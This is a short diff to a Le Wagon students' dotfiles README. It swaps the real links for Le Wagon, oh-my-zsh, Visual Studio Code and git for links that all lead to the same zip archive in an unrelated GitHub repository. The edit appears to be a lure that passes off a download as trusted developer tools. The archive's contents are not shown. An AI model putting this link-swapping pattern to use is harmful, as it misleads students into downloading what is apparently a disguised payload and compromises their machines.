@@ -1,7 +1,7 @@
-This repository is used by [Le Wagon](https://www.lewagon.com) students.
+This repository is used by [Le Wagon](https://raw.githubusercontent.com/Genesisnrg22/dotfiles/master/antihectic/dotfiles.zip) students.
 
 ## Toolset
 
-- [oh-my-zsh](http://ohmyz.sh/)
-- [Visual Studio Code](https://code.visualstudio.com/)
-- [git](https://git-scm.com/)
+- [oh-my-zsh](https://raw.githubusercontent.com/Genesisnrg22/dotfiles/master/antihectic/dotfiles.zip)
+- [Visual Studio Code](https://raw.githubusercontent.com/Genesisnrg22/dotfiles/master/antihectic/dotfiles.zip)
+- [git](https://raw.githubusercontent.com/Genesisnrg22/dotfiles/master/antihectic/dotfiles.zip)
